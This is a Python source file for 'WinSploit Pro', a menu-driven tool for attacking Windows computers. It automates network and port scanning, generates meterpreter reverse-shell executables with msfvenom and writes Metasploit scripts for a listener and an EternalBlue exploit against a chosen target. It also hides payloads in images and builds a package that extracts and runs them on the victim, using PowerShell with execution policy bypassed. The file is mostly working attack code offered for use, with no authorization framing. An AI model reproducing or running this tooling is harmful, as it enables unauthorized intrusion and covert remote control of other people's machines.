#!/usr/bin/env python3
"""
WinSploit Pro - Windows Computer Exploitation Tool
Similar to PhoneSploit Pro but for Windows targets
Author: Custom Script
"""

import os
import sys
import socket
import subprocess
import platform
import time
import threading
from datetime import datetime
try:
    from network_scanner import OptimizedNetworkScanner
    OPTIMIZED_SCANNER_AVAILABLE = True
except ImportError:
    OPTIMIZED_SCANNER_AVAILABLE = False
    print("Warning: Optimized scanner not available. Install requirements: pip install -r requirements.txt")

try:
    from steganography import SteganographyManager
    STEGANOGRAPHY_AVAILABLE = True
except ImportError:
    STEGANOGRAPHY_AVAILABLE = False
    print("Warning: Steganography not available. Install requirements: pip install -r requirements.txt")

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    banner = f"""
{Colors.CYAN}
    ██╗    ██╗██╗███╗   ██╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗    ██████╗ ██████╗  ██████╗ 
    ██║    ██║██║████╗  ██║██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝    ██╔══██╗██╔══██╗██╔═══██╗
    ██║ █╗ ██║██║██╔██╗ ██║███████╗██████╔╝██║     ██║   ██║██║   ██║       ██████╔╝██████╔╝██║   ██║
    ██║███╗██║██║██║╚██╗██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║       ██╔═══╝ ██╔══██╗██║   ██║
    ╚███╔███╔╝██║██║ ╚████║███████║██║     ███████╗╚██████╔╝██║   ██║       ██║     ██║  ██║╚██████╔╝
     ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝       ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
{Colors.END}
{Colors.YELLOW}                           Advanced Windows Exploitation Tool{Colors.END}
{Colors.PURPLE}                                  By Mycosoft Technologies{Colors.END}
{Colors.CYAN}                           Email: mycosoftofficial@gmail.com{Colors.END}
{Colors.CYAN}                           WhatsApp: +256 750501151{Colors.END}
"""
    print(banner)

def check_dependencies():
    """Check if required tools are installed"""
    missing_tools = []
    
    # Check for Metasploit
    try:
        result = subprocess.run(['which', 'msfconsole'], capture_output=True, text=True)
        if result.returncode != 0:
            missing_tools.append("Metasploit Framework")
    except:
        missing_tools.append("Metasploit Framework")
    
    # Check for nmap
    try:
        result = subprocess.run(['which', 'nmap'], capture_output=True, text=True)
        if result.returncode != 0:
            missing_tools.append("Nmap")
    except:
        missing_tools.append("Nmap")
    
    if missing_tools:
        print(f"{Colors.RED}Missing required tools:{Colors.END}")
        for tool in missing_tools:
            print(f"{Colors.YELLOW}- {tool}{Colors.END}")
        print(f"{Colors.RED}Please install missing tools before continuing.{Colors.END}")
        return False
    
    return True

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

def scan_network():
    """Scan local network for Windows computers"""
    if OPTIMIZED_SCANNER_AVAILABLE:
        scanner = OptimizedNetworkScanner()
        
        print(f"{Colors.CYAN}Choose scan mode:{Colors.END}")
        print(f"{Colors.GREEN}1.{Colors.END} Fast scan (service detection only)")
        print(f"{Colors.GREEN}2.{Colors.END} Comprehensive scan (OS + service detection)")
        print(f"{Colors.GREEN}3.{Colors.END} Custom network range")
        print(f"{Colors.GREEN}4.{Colors.END} List all live IPs on local network(s)")
        
        choice = input(f"{Colors.YELLOW}Enter choice (default: 1): {Colors.END}") or "1"
        
        if choice == "1":
            scanner.comprehensive_scan(fast_mode=True)
        elif choice == "2":
            scanner.comprehensive_scan(fast_mode=False)
        elif choice == "3":
            network = input(f"{Colors.YELLOW}Enter network range (e.g., 192.168.1.0/24): {Colors.END}")
            if network:
                fast_mode = input(f"{Colors.YELLOW}Fast mode? (y/N): {Colors.END}").lower() == 'y'
                scanner.comprehensive_scan(network=network, fast_mode=fast_mode)
        elif choice == "4":
            network = input(f"{Colors.YELLOW}Enter network range or leave blank for auto: {Colors.END}")
            if network:
                scanner.list_live_ips(network=network)
            else:
                scanner.list_live_ips()
        else:
            print(f"{Colors.RED}Invalid choice{Colors.END}")
    else:
        # Fallback to original method
        local_ip = get_local_ip()
        network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'

        print(f"{Colors.CYAN}Fast discovery on {network}...{Colors.END}")
        try:
            # Fast ping sweep to list live hosts first
            discovery_cmd = f"nmap -sn -T4 --max-retries 1 --host-timeout 2s {network}"
            discovery = subprocess.run(discovery_cmd, shell=True, capture_output=True, text=True, timeout=120)
            live_ips = []
            for line in discovery.stdout.splitlines():
                if line.startswith("Nmap scan report for "):
                    ip = line.split()[-1]
                    if ip.count('.') == 3:
                        live_ips.append(ip)

            if not live_ips:
                print(f"{Colors.YELLOW}No live hosts found during discovery.{Colors.END}")
                return

            print(f"{Colors.GREEN}Found {len(live_ips)} live hosts. Checking Windows indicators...{Colors.END}")

            # Targeted service scan for Windows indicators on live hosts only
            ports = "135,139,445,3389,5985,5986"
            targets = ' '.join(live_ips)
            service_cmd = f"nmap -sV -T4 --max-retries 1 --host-timeout 10s -p {ports} {targets}"
            service = subprocess.run(service_cmd, shell=True, capture_output=True, text=True, timeout=240)

            out = service.stdout
            if not out:
                print(f"{Colors.YELLOW}No service data returned.{Colors.END}")
                return

            # Simple parse: print host blocks that show SMB/NetBIOS/RDP/WinRM/Microsoft
            indicators = ("microsoft-ds", "netbios-ssn", "ms-wbt-server", "Microsoft", "Windows")
            blocks = out.split("\n\n")
            found_any = False
            for block in blocks:
                lower = block.lower()
                if any(ind.lower() in lower for ind in indicators):
                    print(block.strip() + "\n")
                    found_any = True

            if not found_any:
                print(f"{Colors.YELLOW}No obvious Windows services found. Review live hosts manually:{Colors.END}")
                for ip in live_ips:
                    print(ip)
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}Scan timed out. Try with a smaller network range.{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Scan failed: {e}{Colors.END}")

def port_scan(target_ip):
    """Scan common Windows ports on target"""
    if OPTIMIZED_SCANNER_AVAILABLE:
        scanner = OptimizedNetworkScanner()
        
        print(f"{Colors.CYAN}Choose port scan type:{Colors.END}")
        print(f"{Colors.GREEN}1.{Colors.END} Quick scan (common Windows ports)")
        print(f"{Colors.GREEN}2.{Colors.END} Custom port range")
        
        choice = input(f"{Colors.YELLOW}Enter choice (default: 1): {Colors.END}") or "1"
        
        if choice == "1":
            scanner.quick_port_scan(target_ip)
        elif choice == "2":
            ports_input = input(f"{Colors.YELLOW}Enter ports (comma-separated, e.g., 80,443,3389): {Colors.END}")
            if ports_input:
                try:
                    ports = [int(p.strip()) for p in ports_input.split(',')]
                    scanner.quick_port_scan(target_ip, ports)
                except ValueError:
                    print(f"{Colors.RED}Invalid port format{Colors.END}")
        else:
            print(f"{Colors.RED}Invalid choice{Colors.END}")
    else:
        # Fallback to original method
        print(f"{Colors.CYAN}Scanning common Windows ports on {target_ip}...{Colors.END}")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3389, 5985, 5986]
        
        try:
            cmd = f"nmap -sS -p {','.join(map(str, common_ports))} {target_ip}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            
            if result.stdout:
                print(f"{Colors.GREEN}Port scan results:{Colors.END}")
                print(result.stdout)
            else:
                print(f"{Colors.RED}No results from port scan{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}Port scan failed: {e}{Colors.END}")

def generate_payload():
    """Generate Windows payload using msfvenom"""
    local_ip = get_local_ip()
    
    print(f"{Colors.CYAN}Generating Windows payload...{Colors.END}")
    print(f"{Colors.YELLOW}LHOST will be set to: {local_ip}{Colors.END}")
    
    # Create payloads directory
    os.makedirs("payloads", exist_ok=True)
    
    payload_name = f"windows_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
    payload_path = f"payloads/{payload_name}"
    
    try:
        cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={local_ip} LPORT=4444 -f exe -o {payload_path}"
        print(f"{Colors.YELLOW}Executing: {cmd}{Colors.END}")
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}Payload generated successfully: {payload_path}{Colors.END}")
            return payload_path, local_ip, 4444
        else:
            print(f"{Colors.RED}Payload generation failed:{Colors.END}")
            print(result.stderr)
            return None, None, None
            
    except Exception as e:
        print(f"{Colors.RED}Error generating payload: {e}{Colors.END}")
        return None, None, None

def start_listener(lhost, lport):
    """Start Metasploit listener"""
    print(f"{Colors.CYAN}Starting Metasploit listener on {lhost}:{lport}...{Colors.END}")
    
    # Create resource file for automatic listener setup
    resource_file = "listener.rc"
    with open(resource_file, 'w') as f:
        f.write(f"use exploit/multi/handler\n")
        f.write(f"set payload windows/meterpreter/reverse_tcp\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write(f"exploit -j\n")
    
    print(f"{Colors.YELLOW}Resource file created: {resource_file}{Colors.END}")
    print(f"{Colors.GREEN}Starting Metasploit console...{Colors.END}")
    
    # Start msfconsole with resource file
    cmd = f"msfconsole -r {resource_file}"
    os.system(cmd)

def exploit_smb(target_ip):
    """Attempt SMB exploitation (EternalBlue) after vulnerability check"""
    print(f"{Colors.CYAN}Checking MS17-010 vulnerability on {target_ip}...{Colors.END}")

    try:
        # Quick nmap script check for MS17-010
        check_cmd = f"nmap -p 445 --script smb-vuln-ms17-010 -T4 --max-retries 1 --host-timeout 20s {target_ip}"
        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, timeout=60)
        print(result.stdout)
        vulnerable = "VULNERABLE" in result.stdout.upper()
    except Exception as e:
        print(f"{Colors.YELLOW}Vulnerability check failed: {e}. Proceeding cautiously.{Colors.END}")
        vulnerable = True  # let user choose to proceed

    proceed = 'y'
    if not vulnerable:
        proceed = input(f"{Colors.YELLOW}Target does not appear vulnerable. Proceed anyway? (y/N): {Colors.END}").lower()

    if proceed != 'y':
        print(f"{Colors.RED}Aborted by user.{Colors.END}")
        return

    print(f"{Colors.CYAN}Attempting SMB exploitation on {target_ip}...{Colors.END}")
    local_ip = get_local_ip()

    resource_file = "eternalblue.rc"
    with open(resource_file, 'w') as f:
        f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set payload windows/x64/meterpreter/reverse_tcp\n")
        f.write(f"set LHOST {local_ip}\n")
        f.write(f"set LPORT 4444\n")
        f.write(f"exploit\n")

    print(f"{Colors.YELLOW}Resource file created: {resource_file}{Colors.END}")
    print(f"{Colors.GREEN}Starting Metasploit console...{Colors.END}")
    os.system(f"msfconsole -r {resource_file}")

def attack_console():
    """Open a preloaded Metasploit console with common Windows attack setup."""
    local_ip = get_local_ip()
    resource_file = "attack_console.rc"
    with open(resource_file, 'w') as f:
        f.write("use exploit/multi/handler\n")
        f.write("set payload windows/meterpreter/reverse_tcp\n")
        f.write(f"set LHOST {local_ip}\n")
        f.write("set LPORT 4444\n")
        f.write("set ExitOnSession false\n")
        f.write("exploit -j\n")
        f.write("\n")
        f.write("# Example discovery and auxiliary modules\n")
        f.write("use auxiliary/scanner/smb/smb_ms17_010\n")
        f.write("back\n")
        f.write("use auxiliary/scanner/rdp/rdp_scanner\n")
        f.write("back\n")
        f.write("use auxiliary/scanner/winrm/winrm_auth_methods\n")
        f.write("back\n")
        f.write("# Example exploit placeholders (set RHOSTS before running)\n")
        f.write("use exploit/windows/smb/ms17_010_eternalblue\n")
        f.write("# set RHOSTS <target>\n")
        f.write("back\n")

    print(f"{Colors.YELLOW}Attack console resource: {resource_file}{Colors.END}")
    print(f"{Colors.GREEN}Starting Metasploit console...{Colors.END}")
    os.system(f"msfconsole -r {resource_file}")

def steganography_menu():
    """Steganography operations menu"""
    if not STEGANOGRAPHY_AVAILABLE:
        print(f"{Colors.RED}Steganography module not available. Install requirements first.{Colors.END}")
        return
    
    stego = SteganographyManager()
    
    while True:
        print(f"\n{Colors.BOLD}=== STEGANOGRAPHY MENU ==={Colors.END}")
        print(f"{Colors.YELLOW}⚠️  IMPORTANT: Steganographic images need extraction on target!{Colors.END}")
        print(f"{Colors.GREEN}1.{Colors.END} Hide Payload in Image")
        print(f"{Colors.GREEN}2.{Colors.END} Extract Payload from Image")
        print(f"{Colors.GREEN}3.{Colors.END} Check Image Capacity")
        print(f"{Colors.GREEN}4.{Colors.END} List Suitable Images")
        print(f"{Colors.GREEN}5.{Colors.END} Generate Payload + Hide in Image")
        print(f"{Colors.CYAN}6.{Colors.END} Create Windows Extraction Package")
        print(f"{Colors.CYAN}7.{Colors.END} Show Steganography Workflow")
        print(f"{Colors.RED}0.{Colors.END} Back to Main Menu")
        
        choice = input(f"\n{Colors.CYAN}Enter your choice: {Colors.END}")
        
        if choice == '1':
            hide_payload_in_image(stego)
        elif choice == '2':
            extract_payload_from_image(stego)
        elif choice == '3':
            check_image_capacity(stego)
        elif choice == '4':
            list_suitable_images(stego)
        elif choice == '5':
            generate_and_hide_payload(stego)
        elif choice == '6':
            create_windows_extraction_package()
        elif choice == '7':
            show_steganography_workflow()
        elif choice == '0':
            break
        else:
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")

def hide_payload_in_image(stego):
    """Hide payload in image"""
    print(f"\n{Colors.CYAN}Hide Payload in Image{Colors.END}")
    
    # Get payload file
    payload_path = input(f"{Colors.YELLOW}Enter payload file path: {Colors.END}")
    if not payload_path or not os.path.exists(payload_path):
        print(f"{Colors.RED}Payload file not found.{Colors.END}")
        return
    
    # Get image file
    image_path = input(f"{Colors.YELLOW}Enter image file path: {Colors.END}")
    if not image_path or not os.path.exists(image_path):
        print(f"{Colors.RED}Image file not found.{Colors.END}")
        return
    
    # Check image capacity
    capacity = stego.get_image_capacity(image_path)
    payload_size = os.path.getsize(payload_path)
    
    print(f"{Colors.CYAN}Image capacity: {capacity} bytes{Colors.END}")
    print(f"{Colors.CYAN}Payload size: {payload_size} bytes{Colors.END}")
    
    if payload_size > capacity:
        print(f"{Colors.RED}Payload too large for this image. Choose a larger image.{Colors.END}")
        return
    
    # Get output path
    output_path = input(f"{Colors.YELLOW}Enter output image path: {Colors.END}")
    if not output_path:
        output_path = f"stego_{os.path.basename(image_path)}"
    
    # Optional encryption
    encrypt = input(f"{Colors.YELLOW}Encrypt payload? (y/N): {Colors.END}").lower() == 'y'
    password = None
    if encrypt:
        password = input(f"{Colors.YELLOW}Enter encryption password: {Colors.END}")
        if not password:
            print(f"{Colors.RED}Password required for encryption.{Colors.END}")
            return
    
    # Hide payload
    if stego.hide_payload_in_image(payload_path, image_path, output_path, password):
        print(f"{Colors.GREEN}Payload successfully hidden!{Colors.END}")
        print(f"{Colors.YELLOW}Steganographic image: {output_path}{Colors.END}")
    else:
        print(f"{Colors.RED}Failed to hide payload.{Colors.END}")

def extract_payload_from_image(stego):
    """Extract payload from image"""
    print(f"\n{Colors.CYAN}Extract Payload from Image{Colors.END}")
    
    # Get steganographic image
    image_path = input(f"{Colors.YELLOW}Enter steganographic image path: {Colors.END}")
    if not image_path or not os.path.exists(image_path):
        print(f"{Colors.RED}Image file not found.{Colors.END}")
        return
    
    # Get output path
    output_path = input(f"{Colors.YELLOW}Enter output payload path: {Colors.END}")
    if not output_path:
        output_path = "extracted_payload.exe"
    
    # Check if encrypted
    encrypted = input(f"{Colors.YELLOW}Is payload encrypted? (y/N): {Colors.END}").lower() == 'y'
    password = None
    if encrypted:
        password = input(f"{Colors.YELLOW}Enter decryption password: {Colors.END}")
    
    # Extract payload
    if stego.extract_payload_from_image(image_path, output_path, password):
        print(f"{Colors.GREEN}Payload successfully extracted!{Colors.END}")
        print(f"{Colors.YELLOW}Extracted payload: {output_path}{Colors.END}")
    else:
        print(f"{Colors.RED}Failed to extract payload.{Colors.END}")

def check_image_capacity(stego):
    """Check image capacity for steganography"""
    print(f"\n{Colors.CYAN}Check Image Capacity{Colors.END}")
    
    image_path = input(f"{Colors.YELLOW}Enter image file path: {Colors.END}")
    if not image_path or not os.path.exists(image_path):
        print(f"{Colors.RED}Image file not found.{Colors.END}")
        return
    
    if not stego.validate_image(image_path):
        print(f"{Colors.RED}Image not suitable for steganography.{Colors.END}")
        print(f"{Colors.YELLOW}Supported formats: PNG, BMP, TIFF{Colors.END}")
        return
    
    capacity = stego.get_image_capacity(image_path)
    print(f"{Colors.GREEN}Image capacity: {capacity} bytes ({capacity/1024:.1f} KB){Colors.END}")
    
    # Show comparison with common payload sizes
    print(f"\n{Colors.CYAN}Payload size reference:{Colors.END}")
    print(f"- Small payload: ~50-100 KB")
    print(f"- Medium payload: ~200-500 KB")
    print(f"- Large payload: ~1-5 MB")

def list_suitable_images(stego):
    """List suitable images in directory"""
    print(f"\n{Colors.CYAN}List Suitable Images{Colors.END}")
    
    directory = input(f"{Colors.YELLOW}Enter directory path (default: current): {Colors.END}") or "."
    
    if not os.path.exists(directory):
        print(f"{Colors.RED}Directory not found.{Colors.END}")
        return
    
    images = stego.list_suitable_images(directory)
    
    if not images:
        print(f"{Colors.YELLOW}No suitable images found in directory.{Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}Suitable images found:{Colors.END}")
    for i, img in enumerate(images, 1):
        print(f"{i}. {img['filename']} - Capacity: {img['capacity']/1024:.1f} KB")

def generate_and_hide_payload(stego):
    """Generate payload and hide in image"""
    print(f"\n{Colors.CYAN}Generate Payload + Hide in Image{Colors.END}")
    
    # Generate payload first
    payload_path, lhost, lport = generate_payload()
    if not payload_path:
        print(f"{Colors.RED}Failed to generate payload.{Colors.END}")
        return
    
    print(f"{Colors.GREEN}Payload generated: {payload_path}{Colors.END}")
    
    # Get image file
    image_path = input(f"{Colors.YELLOW}Enter image file path: {Colors.END}")
    if not image_path or not os.path.exists(image_path):
        print(f"{Colors.RED}Image file not found.{Colors.END}")
        return
    
    # Check capacity
    capacity = stego.get_image_capacity(image_path)
    payload_size = os.path.getsize(payload_path)
    
    if payload_size > capacity:
        print(f"{Colors.RED}Payload ({payload_size} bytes) too large for image ({capacity} bytes).{Colors.END}")
        return
    
    # Get output path
    output_path = input(f"{Colors.YELLOW}Enter output image path: {Colors.END}")
    if not output_path:
        output_path = f"stego_{os.path.basename(image_path)}"
    
    # Optional encryption
    encrypt = input(f"{Colors.YELLOW}Encrypt payload? (y/N): {Colors.END}").lower() == 'y'
    password = None
    if encrypt:
        password = input(f"{Colors.YELLOW}Enter encryption password: {Colors.END}")
    
    # Hide payload
    if stego.hide_payload_in_image(payload_path, image_path, output_path, password):
        print(f"{Colors.GREEN}Payload successfully hidden in image!{Colors.END}")
        print(f"{Colors.YELLOW}Steganographic image: {output_path}{Colors.END}")
        print(f"\n{Colors.BOLD}🚨 CRITICAL NEXT STEPS:{Colors.END}")
        print(f"{Colors.RED}1. Start listener NOW: LHOST={lhost}, LPORT={lport}{Colors.END}")
        print(f"{Colors.YELLOW}2. Transfer {output_path} to target Windows PC{Colors.END}")
        print(f"{Colors.YELLOW}3. Transfer extraction tools to target (use option 6){Colors.END}")
        print(f"{Colors.RED}4. EXTRACT payload on target: python windows_extractor.py {output_path} {password if password else '[no password]'}{Colors.END}")
        print(f"\n{Colors.CYAN}⚠️  The image alone won't execute - you MUST extract the payload on target!{Colors.END}")
        
        # Ask if user wants to start listener now
        start_listener = input(f"\n{Colors.YELLOW}Start Metasploit listener now? (y/N): {Colors.END}").lower() == 'y'
        if start_listener:
            start_listener(lhost, lport)
    else:
        print(f"{Colors.RED}Failed to hide payload in image.{Colors.END}")

def create_windows_extraction_package():
    """Create a package with extraction tools for Windows targets"""
    print(f"\n{Colors.CYAN}Create Windows Extraction Package{Colors.END}")
    
    package_dir = "windows_extraction_package"
    os.makedirs(package_dir, exist_ok=True)
    
    # Copy extraction files
    files_to_copy = [
        "windows_extractor.py",
        "extract_and_run.bat", 
        "Extract-Payload.ps1"
    ]
    
    copied_files = []
    for file in files_to_copy:
        if os.path.exists(file):
            import shutil
            dest = os.path.join(package_dir, file)
            shutil.copy2(file, dest)
            copied_files.append(file)
    
    # Create README for the package
    readme_content = """# Windows Extraction Package

## Files Included:
- windows_extractor.py - Python extraction script
- extract_and_run.bat - Windows batch file
- Extract-Payload.ps1 - PowerShell script

## Usage:
1. Transfer your steganographic image to the target Windows PC
2. Transfer this entire folder to the target Windows PC
3. Run one of the extraction methods:

### Method 1 - Python (if available):
python windows_extractor.py your_image.png [password]

### Method 2 - Batch file:
extract_and_run.bat your_image.png [password]

### Method 3 - PowerShell:
PowerShell -ExecutionPolicy Bypass -File Extract-Payload.ps1 -ImagePath your_image.png -Password yourpassword

## Important:
- Make sure your Metasploit listener is running BEFORE executing
- Use the same LHOST/LPORT as when you created the payload
- If encrypted, provide the correct password
"""
    
    with open(os.path.join(package_dir, "README.txt"), 'w') as f:
        f.write(readme_content)
    
    print(f"{Colors.GREEN}Windows extraction package created: {package_dir}/{Colors.END}")
    print(f"{Colors.YELLOW}Files included:{Colors.END}")
    for file in copied_files:
        print(f"  - {file}")
    print(f"  - README.txt")
    print(f"\n{Colors.CYAN}Transfer this entire folder to your target Windows PC{Colors.END}")

def show_steganography_workflow():
    """Display the complete steganography workflow"""
    print(f"\n{Colors.BOLD}=== STEGANOGRAPHY WORKFLOW ==={Colors.END}")
    print(f"\n{Colors.RED}❗ CRITICAL: Why your payload isn't connecting{Colors.END}")
    print(f"{Colors.YELLOW}When you hide a payload in an image, it's EMBEDDED inside the image.{Colors.END}")
    print(f"{Colors.YELLOW}Simply transferring the image does NOT execute the payload!{Colors.END}")
    
    print(f"\n{Colors.CYAN}✅ CORRECT WORKFLOW:{Colors.END}")
    print(f"{Colors.GREEN}1. On Kali/Linux:{Colors.END}")
    print(f"   • Generate payload + hide in image (option 5)")
    print(f"   • Start Metasploit listener (option 5 in main menu)")
    print(f"   • Note the LHOST and LPORT values!")
    
    print(f"\n{Colors.GREEN}2. Transfer to Windows target:{Colors.END}")
    print(f"   • The steganographic image")
    print(f"   • Extraction tools (use option 6 to create package)")
    
    print(f"\n{Colors.GREEN}3. On Windows target:{Colors.END}")
    print(f"   • Run extraction script:")
    print(f"     - python windows_extractor.py image.png [password]")
    print(f"     - OR extract_and_run.bat image.png [password]")
    print(f"     - OR PowerShell script")
    
    print(f"\n{Colors.GREEN}4. Check your listener:{Colors.END}")
    print(f"   • You should now see a session!")
    
    print(f"\n{Colors.RED}❌ WRONG WORKFLOW (what you probably did):{Colors.END}")
    print(f"   1. Hide payload in image")
    print(f"   2. Transfer image to Windows")
    print(f"   3. ??? (missing extraction step)")
    print(f"   4. No connection because payload was never extracted/executed")
    
    print(f"\n{Colors.CYAN}💡 Quick Test:{Colors.END}")
    print(f"   Test extraction locally first:")
    print(f"   python windows_extractor.py your_stego_image.png password")
    
    print(f"\n{Colors.YELLOW}📖 For detailed guide, see: STEGANOGRAPHY_WORKFLOW.md{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")

def main_menu():
    """Display main menu and handle user input"""
    while True:
        print(f"\n{Colors.BOLD}=== MAIN MENU ==={Colors.END}")
        scanner_status = f"{Colors.GREEN}[OPTIMIZED]{Colors.END}" if OPTIMIZED_SCANNER_AVAILABLE else f"{Colors.YELLOW}[BASIC]{Colors.END}"
        print(f"{Colors.GREEN}1.{Colors.END} Scan Network for Windows Computers {scanner_status}")
        print(f"{Colors.GREEN}2.{Colors.END} List all live IPs {scanner_status}")
        print(f"{Colors.GREEN}3.{Colors.END} Port Scan Target {scanner_status}")
        print(f"{Colors.GREEN}4.{Colors.END} Generate Windows Payload")
        print(f"{Colors.GREEN}5.{Colors.END} Start Metasploit Listener")
        print(f"{Colors.GREEN}6.{Colors.END} Exploit SMB (EternalBlue)")
        print(f"{Colors.GREEN}7.{Colors.END} Custom Metasploit Console")
        print(f"{Colors.GREEN}8.{Colors.END} Preloaded Attack Console")
        stego_status = f"{Colors.GREEN}[AVAILABLE]{Colors.END}" if STEGANOGRAPHY_AVAILABLE else f"{Colors.RED}[UNAVAILABLE]{Colors.END}"
        print(f"{Colors.GREEN}9.{Colors.END} Steganography (Hide Payloads in Images) {stego_status}")
        if not OPTIMIZED_SCANNER_AVAILABLE:
            print(f"{Colors.YELLOW}10.{Colors.END} Setup Optimized Scanner")
        print(f"{Colors.RED}0.{Colors.END} Exit")
        
        choice = input(f"\n{Colors.CYAN}Enter your choice: {Colors.END}")
        
        if choice == '1':
            scan_network()
            
        elif choice == '2':
            if OPTIMIZED_SCANNER_AVAILABLE:
                scanner = OptimizedNetworkScanner()
                network = input(f"{Colors.YELLOW}Enter network range or leave blank for auto: {Colors.END}")
                if network:
                    scanner.list_live_ips(network=network)
                else:
                    scanner.list_live_ips()
            else:
                print(f"{Colors.YELLOW}Optimized scanner required. Choose option 7/8 to set up.{Colors.END}")

        elif choice == '3':
            target = input(f"{Colors.YELLOW}Enter target IP: {Colors.END}")
            if target:
                port_scan(target)
                
        elif choice == '4':
            payload_path, lhost, lport = generate_payload()
            if payload_path:
                print(f"{Colors.GREEN}Next steps:{Colors.END}")
                print(f"1. Transfer {payload_path} to target Windows computer")
                print(f"2. Start listener (option 4)")
                print(f"3. Execute payload on target")
                
        elif choice == '5':
            lhost = input(f"{Colors.YELLOW}Enter LHOST (default: {get_local_ip()}): {Colors.END}") or get_local_ip()
            lport = input(f"{Colors.YELLOW}Enter LPORT (default: 4444): {Colors.END}") or "4444"
            start_listener(lhost, lport)
            
        elif choice == '6':
            target = input(f"{Colors.YELLOW}Enter target IP: {Colors.END}")
            if target:
                exploit_smb(target)
                
        elif choice == '7':
            print(f"{Colors.GREEN}Starting Metasploit console...{Colors.END}")
            os.system("msfconsole")
            
        elif choice == '8':
            attack_console()
            
        elif choice == '9':
            steganography_menu()

        elif choice == '10' and not OPTIMIZED_SCANNER_AVAILABLE:
            print(f"{Colors.CYAN}Setting up optimized scanner...{Colors.END}")
            print(f"{Colors.YELLOW}Run the following commands:{Colors.END}")
            print(f"1. chmod +x setup.sh")
            print(f"2. ./setup.sh")
            print(f"3. source venv/bin/activate")
            print(f"4. python3 winsploit.py")
            
        elif choice == '0':
            print(f"{Colors.GREEN}Goodbye!{Colors.END}")
            break
            
        else:
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")

def main():
    """Main function"""
    print_banner()
    
    if not check_dependencies():
        sys.exit(1)
    
    print(f"{Colors.GREEN}All dependencies found!{Colors.END}")
    print(f"{Colors.YELLOW}Local IP: {get_local_ip()}{Colors.END}")
    
    main_menu()

if __name__ == "__main__":
    main()
